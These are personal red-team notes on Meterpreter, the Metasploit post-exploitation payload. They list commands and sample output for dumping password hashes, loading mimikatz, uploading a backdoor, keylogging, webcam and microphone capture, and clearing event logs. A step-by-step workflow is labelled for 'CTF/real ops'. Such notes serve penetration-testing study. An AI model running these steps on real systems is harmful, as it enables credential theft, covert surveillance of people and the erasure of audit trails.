
```
date: 2025-09-17
author: Sameer Saini  
reason: 0x45
title: Meterpreter Notes
tags: [meterpreter, metasploit, post-exploitation, red-team]
```

---

## How Meterpreter Works

- **In-memory execution** → Does not touch the disk, reducing AV detection.  
- **Encrypted communication** → Uses TLS/SSL or other secure channels to evade IDS/IPS.  
- **Modular** → Extensions can be dynamically loaded (e.g., `priv`, `stdapi`, `kiwi`).  
- **Flexible transports** → Supports reverse TCP, reverse HTTP/S, staged or stageless payloads.  

Your decision on which Meterpreter to use depends on:
1. **Target OS** → Windows, Linux, macOS, Android.  
2. **Available components** → Python/Java/PHP present?  
3. **Network conditions** → TCP vs HTTPS reverse shell, IPv4 vs IPv6 stealth.  

---

## Meterpreter Commands

### 🔹 Core Commands
- `background` → Background the session  
- `exit` → Close session  
- `migrate` → Move Meterpreter to a stable process (e.g., `explorer.exe`)  
- `sessions -i <id>` → Switch between sessions  

---

### 🔹 File System
- `ls`, `cd`, `pwd` → Navigate target’s filesystem  
- `download secret.txt` → Download files  
- `upload backdoor.exe` → Upload files  
- `search -f *.docx` → Search for sensitive files  

---

### 🔹 Networking
- `ifconfig` / `ipconfig` → View network interfaces  
- `netstat` → View active connections  
- `portfwd add -l 8080 -p 80 -r 10.0.0.5` → Forward local port 8080 to target’s port 80  
- `arp` → View ARP cache (can reveal other targets on LAN)  

---

### 🔹 System
- `sysinfo` → OS + hostname info  
- `getuid` → Current user context  
- `ps` → List processes  
- `kill <pid>` → Kill a process  
- `reboot` / `shutdown` → Restart/turn off target  

---

### 🔹 Privilege & Credential Stuff
- `getsystem` → Try privilege escalation to SYSTEM  
- `hashdump` → Dump SAM hashes  
- `load kiwi` → Load mimikatz module for credential extraction  
- `clearev` → Clear event logs (cover tracks)  

---

### 🔹 Monitoring & Surveillance
- `screenshare` → Watch live desktop  
- `screenshot` → Capture desktop  
- `record_mic -d 10` → Record 10 sec from microphone  
- `webcam_snap` → Take webcam picture  
- `keyscan_start` / `keyscan_dump` / `keyscan_stop` → Capture keystrokes  

---

## 🔥 Post-Exploitation Workflow (with Examples)

1. **Identify User Context**
   ```bash
   meterpreter > getuid
   Server username: WIN-LAB\victim
```

→ Confirms what privileges we have. If it’s not SYSTEM, attempt privilege escalation.

---

2. **Process Enumeration**
    
    ```bash
    meterpreter > ps
    PID   Name              Arch  Session  User
    1120  explorer.exe      x64   1        WIN-LAB\victim
    1337  lsass.exe         x64   0        NT AUTHORITY\SYSTEM
    ```
    
    → Shows running processes. Target `explorer.exe` for stability or `lsass.exe` for creds.
    

---

3. **Migrate to Stable Process**
    
    ```bash
    meterpreter > migrate 1120
    [*] Migrating from 1050 to 1120...
    [*] Migration completed successfully.
    ```
    
    → Moves Meterpreter to `explorer.exe` to avoid crashes.
    

---

4. **Dump Password Hashes**
    
    ```bash
    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    victim:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
    ```
    
    → Hashes can be cracked offline or passed for lateral movement.
    

---

5. **Search for Sensitive Files**
    
    ```bash
    meterpreter > search -f *passwords*.txt
    Found: C:\Users\victim\Desktop\passwords.txt
    ```
    
    → Look for config files, documents, credentials.
    

---

6. **Spawn a Shell**
    
    ```bash
    meterpreter > shell
    C:\Users\victim> whoami
    win-lab\victim
    ```
    
    → Drops into system command shell for native commands.
    

---

7. **Cover Tracks**
    
    ```bash
    meterpreter > clearev
    ```
    
    → Clear Windows event logs after finishing.
    

---

✅ **Post-exploitation flow in CTF/real ops** →  
`getuid → ps → migrate → sysinfo → hashdump → search → shell → cover tracks`

---
